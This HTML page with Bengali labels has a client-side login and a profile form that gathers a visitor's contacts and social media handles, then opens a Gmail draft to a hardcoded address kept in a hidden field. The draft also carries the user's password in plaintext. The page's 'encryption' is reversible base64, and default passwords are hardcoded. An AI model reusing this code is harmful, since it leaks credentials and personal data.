<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>রিকুয়েস্ট ফর্ম - প্রোফাইল সাবমিট</title>

<style>
body{
    font-family: Arial;
    background:#0f0c29;
    color:white;
    display:flex;
    justify-content:center;
}

.container{
    width:400px;
    padding:20px;
}

.box{
    background:#1a1a2e;
    padding:20px;
    border-radius:12px;
    margin-bottom:20px;
}

h3{
    text-align:center;
    margin-bottom:15px;
    color:#ff00cc;
}

label{
    font-size:13px;
    display:block;
    margin-top:10px;
    margin-bottom:5px;
    color:#ccc;
}

input, textarea{
    width:100%;
    padding:10px;
    margin:5px 0;
    border:none;
    border-radius:8px;
    background:#0f0c29;
    color:white;
    box-sizing:border-box;
}

textarea{
    resize:vertical;
    min-height:60px;
    font-family:Arial;
}

button{
    width:100%;
    padding:12px;
    background:#ff00cc;
    border:none;
    border-radius:10px;
    color:white;
    margin-top:15px;
    font-weight:bold;
    cursor:pointer;
    transition:0.3s;
}

button:hover{
    background:#cc0099;
    transform:scale(1.02);
}

.login-btn, .logout-btn{
    margin-top:10px;
}

.login-btn{
    background:#00ccff;
}

.login-btn:hover{
    background:#0099cc;
}

.logout-btn{
    background:#ff4444;
}

.logout-btn:hover{
    background:#cc0000;
}

.status{
    text-align:center;
    margin-top:10px;
    font-size:13px;
    padding:8px;
    border-radius:8px;
}

.status-success{
    background:#00cc8844;
    color:#00ffaa;
}

.status-error{
    background:#ff444444;
    color:#ff8888;
}

hr{
    border-color:#ff00cc33;
    margin:15px 0;
}
</style>
</head>

<body>

<div class="container">

<!-- 🔐 লগইন বক্স -->
<div class="box">
<h3>🔑 লগইন করুন</h3>
<input type="text" id="loginUser" placeholder="ইউজারনেম">
<input type="password" id="loginPass" placeholder="পাসওয়ার্ড">
<button class="login-btn" onclick="login()">লগইন</button>
<button class="logout-btn" onclick="logout()">লগআউট</button>
<div id="loginStatus" class="status"></div>
</div>

<!-- 📝 রিকুয়েস্ট ফর্ম -->
<div class="box" id="formBox">
<h3>📋 আপনার তথ্য জমা দিন</h3>

<form id="requestForm">

<!-- 📧 আপনার ইমেইল এড্রেস (যেখানে রিপোর্ট যাবে) - এখানে আপনার ইমেইল দিন -->
<input type="hidden" id="receiverEmail" value="inyt_444@outlook.com">

<!-- ১. Your Email -->
<label>📧 1. Your Email</label>
<input type="email" id="yourEmail" placeholder="example@gmail.com" required>

<!-- ২. Your Username -->
<label>👤 2. Your Username</label>
<input type="text" id="yourUsername" placeholder="john_doe">

<!-- ৩. Your Profile Picture Link -->
<label>🖼️ 3. Your Profile Picture Link</label>
<input type="url" id="profilePic" placeholder="https://example.com/photo.jpg">

<!-- ৪. Your Facebook Username -->
<label>📘 4. Your Facebook Username</label>
<input type="text" id="fbUsername" placeholder="johndoe">

<!-- ৫. Your Facebook Page Username -->
<label>📘 5. Your Facebook Page Username</label>
<input type="text" id="fbPageUsername" placeholder="johndoepage">

<!-- ৬. Your Instagram Username -->
<label>📷 6. Your Instagram Username</label>
<input type="text" id="igUsername" placeholder="@johndoe">

<!-- ৭. Your WhatsApp Number -->
<label>💬 7. Your WhatsApp Number</label>
<input type="tel" id="whatsapp" placeholder="+8801XXXXXXXXX">

<!-- ৮. Your TikTok Username -->
<label>🎵 8. Your TikTok Username</label>
<input type="text" id="tiktok" placeholder="@johndoe">

<!-- ৯. Your Telegram Username -->
<label>✈️ 9. Your Telegram Username</label>
<input type="text" id="telegram" placeholder="@johndoe">

<!-- ১০. Your Twitter (X) Username -->
<label>🐦 10. Your Twitter (X) Username</label>
<input type="text" id="twitter" placeholder="@johndoe">

<!-- ১১. Your Phone Number -->
<label>📞 11. Your Phone Number</label>
<input type="tel" id="phone" placeholder="+8801XXXXXXXXX">

<!-- ১২. Your About -->
<label>📝 12. Your About</label>
<textarea id="about" placeholder="নিজের সম্পর্কে কিছু লিখুন..."></textarea>

<!-- ১৩. Your Website Link -->
<label>🌐 13. Your Website Link</label>
<input type="url" id="website" placeholder="https://yourwebsite.com">

<button type="button" id="submitBtn" onclick="sendToGmail()">🚀 সাবমিট করুন</button>

</form>

<div id="formStatus" class="status"></div>
</div>

</div>

<script>
// =============== ইউজার ডাটাবেস (পাসওয়ার্ড এনক্রিপ্টেড) ===============
function encrypt(pwd){
    return btoa(pwd.split('').reverse().join('') + 'fix2026');
}

function decrypt(encrypted){
    try{
        let dec = atob(encrypted);
        return dec.slice(0, -7).split('').reverse().join('');
    } catch(e){ return ''; }
}

// লোকাল স্টোরেজ থেকে ইউজার লোড
let users = {};

function loadUsers(){
    let stored = localStorage.getItem('secure_users');
    if(stored){
        users = JSON.parse(stored);
    } else {
        // ডিফল্ট ইউজার: admin / 1234 , user1 / 1111 , user2 / 2222
        users = {
            "admin": encrypt("1234"),
            "user1": encrypt("1111"),
            "user2": encrypt("2222")
        };
        saveUsers();
    }
}

function saveUsers(){
    localStorage.setItem('secure_users', JSON.stringify(users));
}

loadUsers();

// কারেন্ট লগইন ইউজার
let currentUser = localStorage.getItem("currentUser") || null;

// =============== লগইন ফাংশন ===============
function login(){
    let u = document.getElementById("loginUser").value.trim();
    let p = document.getElementById("loginPass").value.trim();
    let statusDiv = document.getElementById("loginStatus");

    if(!u || !p){
        statusDiv.innerHTML = '<div class="status-error">❌ ইউজারনেম ও পাসওয়ার্ড দিন</div>';
        return;
    }

    if(users[u] && decrypt(users[u]) === p){
        currentUser = u;
        localStorage.setItem("currentUser", u);
        statusDiv.innerHTML = `<div class="status-success">✅ লগইন সফল! স্বাগতম ${u}</div>`;
        document.getElementById("loginUser").value = "";
        document.getElementById("loginPass").value = "";
        updateSubmitButton();
    } else {
        statusDiv.innerHTML = '<div class="status-error">❌ ভুল ইউজারনেম বা পাসওয়ার্ড</div>';
    }
}

function logout(){
    currentUser = null;
    localStorage.removeItem("currentUser");
    document.getElementById("loginStatus").innerHTML = '<div class="status-success">🚪 লগআউট হয়েছে</div>';
    updateSubmitButton();
}

// লগইন স্টেট অনুযায়ী সাবমিট বাটন কন্ট্রোল
function updateSubmitButton(){
    const submitBtn = document.getElementById("submitBtn");
    const formStatus = document.getElementById("formStatus");
    
    if(currentUser){
        submitBtn.disabled = false;
        submitBtn.style.opacity = "1";
        submitBtn.style.cursor = "pointer";
        formStatus.innerHTML = `<div class="status-success">✅ লগইন করেছেন: ${currentUser} | এখন ফর্ম জমা দিতে পারবেন</div>`;
    } else {
        submitBtn.disabled = true;
        submitBtn.style.opacity = "0.5";
        submitBtn.style.cursor = "not-allowed";
        formStatus.innerHTML = '<div class="status-error">🔒 ফর্ম জমা দিতে উপরে লগইন করুন</div>';
    }
}

// =============== Gmail এ পাঠানোর ফাংশন ===============
function sendToGmail(){
    // চেক করা লগইন করা আছে কিনা
    if(!currentUser){
        alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
        return;
    }
    
    // ফর্মের সব ডাটা সংগ্রহ করা
    let yourEmail = document.getElementById("yourEmail").value;
    let yourUsername = document.getElementById("yourUsername").value;
    let profilePic = document.getElementById("profilePic").value;
    let fbUsername = document.getElementById("fbUsername").value;
    let fbPageUsername = document.getElementById("fbPageUsername").value;
    let igUsername = document.getElementById("igUsername").value;
    let whatsapp = document.getElementById("whatsapp").value;
    let tiktok = document.getElementById("tiktok").value;
    let telegram = document.getElementById("telegram").value;
    let twitter = document.getElementById("twitter").value;
    let phone = document.getElementById("phone").value;
    let about = document.getElementById("about").value;
    let website = document.getElementById("website").value;
    
    // ইমেইল ভ্যালিডেশন
    if(!yourEmail){
        alert("❌ অনুগ্রহ করে আপনার ইমেইল এড্রেস দিন!");
        return;
    }
    
    if(!yourEmail.includes('@') || !yourEmail.includes('.')){
        alert("❌ সঠিক ইমেইল এড্রেস দিন!");
        return;
    }
    
    // রিসিভারের ইমেইল (যেখানে রিপোর্ট যাবে)
    let receiverEmail = document.getElementById("receiverEmail").value;
    
    // লগইন করা ইউজারের পাসওয়ার্ড ডিক্রিপ্ট করা
    let loggedInPassword = decrypt(users[currentUser]);
    
    // ইমেইলের সাবজেক্ট
    let subject = `🔔 নতুন রিকুয়েস্ট ফর্ম জমা হয়েছে - ${yourUsername || yourEmail}`;
    
    // ইমেইলের বডি তৈরি করা (সুন্দর ফরম্যাটে)
    let body = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 নিচের তথ্য জমা দেওয়া হয়েছে:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 লগইন তথ্য:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ইউজারনেম: ${currentUser}
পাসওয়ার্ড: ${loggedInPassword}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 ব্যবহারকারীর দেওয়া তথ্য:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📧 ১. ইমেইল: ${yourEmail}
👤 ২. ইউজারনেম: ${yourUsername || "দেওয়া হয়নি"}
🖼️ ৩. প্রোফাইল ছবি লিংক: ${profilePic || "দেওয়া হয়নি"}
📘 ৪. ফেসবুক ইউজারনেম: ${fbUsername || "দেওয়া হয়নি"}
📘 ৫. ফেসবুক পেইজ ইউজারনেম: ${fbPageUsername || "দেওয়া হয়নি"}
📷 ৬. ইনস্টাগ্রাম ইউজারনেম: ${igUsername || "দেওয়া হয়নি"}
💬 ৭. হোয়াটসঅ্যাপ নম্বর: ${whatsapp || "দেওয়া হয়নি"}
🎵 ৮. টিকটক ইউজারনেম: ${tiktok || "দেওয়া হয়নি"}
✈️ ৯. টেলিগ্রাম ইউজারনেম: ${telegram || "দেওয়া হয়নি"}
🐦 ১০. টুইটার (X) ইউজারনেম: ${twitter || "দেওয়া হয়নি"}
📞 ১১. ফোন নম্বর: ${phone || "দেওয়া হয়নি"}
📝 ১২. সম্পর্কে: ${about || "দেওয়া হয়নি"}
🌐 ১৩. ওয়েবসাইট লিংক: ${website || "দেওয়া হয়নি"}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD')}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

এই ইমেইলটি অটোমেটিক জেনারেট করা হয়েছে।
ধন্যবাদ! 🙏
`;
    
    // এনকোড করা (URL encoding for mailto)
    let encodedSubject = encodeURIComponent(subject);
    let encodedBody = encodeURIComponent(body);
    
    // Gmail mailto লিংক তৈরি করা
    let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${receiverEmail}&su=${encodedSubject}&body=${encodedBody}`;
    
    // মোবাইল ডিভাইস চেক করা
    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    if(isMobile){
        // মোবাইলে Gmail অ্যাপ ওপেন হবে (যদি ইনস্টল থাকে)
        window.location.href = `intent://mail/${receiverEmail}#Intent;scheme=mailto;package=com.google.android.gm;action=android.intent.action.SENDTO;S.browser_fallback_url=https://mail.google.com;end`;
        
        // ফallback যদি intent কাজ না করে
        setTimeout(() => {
            window.open(gmailLink, '_blank');
        }, 500);
    } else {
        // ডেস্কটপে Gmail ওপেন হবে
        window.open(gmailLink, '_blank');
    }
    
    // স্ট্যাটাস মেসেজ দেখানো
    let formStatus = document.getElementById("formStatus");
    formStatus.innerHTML = '<div class="status-success">✅ Gmail ওপেন হচ্ছে! দয়া করে ইমেইল চেক করে Send এ ক্লিক করুন।</div>';
    
    // ৩ সেকেন্ড পর স্ট্যাটাস ক্লিয়ার করা
    setTimeout(() => {
        if(formStatus.innerHTML.includes('Gmail ওপেন হচ্ছে')){
            formStatus.innerHTML = '<div class="status-success">✅ ফর্ম সফলভাবে প্রস্তুত! ইমেইল পাঠানোর জন্য Send বাটনে ক্লিক করুন।</div>';
        }
    }, 3000);
    
    // অপশনাল: ফর্ম ক্লিয়ার করার জন্য (চাইলে কমেন্ট আউট করুন)
    // clearForm();
}

// ফর্ম ক্লিয়ার করার ফাংশন (প্রয়োজনে ব্যবহার করুন)
function clearForm(){
    document.getElementById("yourEmail").value = "";
    document.getElementById("yourUsername").value = "";
    document.getElementById("profilePic").value = "";
    document.getElementById("fbUsername").value = "";
    document.getElementById("fbPageUsername").value = "";
    document.getElementById("igUsername").value = "";
    document.getElementById("whatsapp").value = "";
    document.getElementById("tiktok").value = "";
    document.getElementById("telegram").value = "";
    document.getElementById("twitter").value = "";
    document.getElementById("phone").value = "";
    document.getElementById("about").value = "";
    document.getElementById("website").value = "";
}

// পেজ লোডে বাটন স্টেট সেট করা
updateSubmitButton();

// পেজ রিফ্রেশ করলেও লগইন স্টেট চেক
window.onload = function(){
    if(localStorage.getItem("currentUser")){
        currentUser = localStorage.getItem("currentUser");
        updateSubmitButton();
        document.getElementById("loginStatus").innerHTML = `<div class="status-success">✅ ইতিমধ্যে লগইন করেছেন: ${currentUser}</div>`;
    }
}
</script>

</body>
</html>
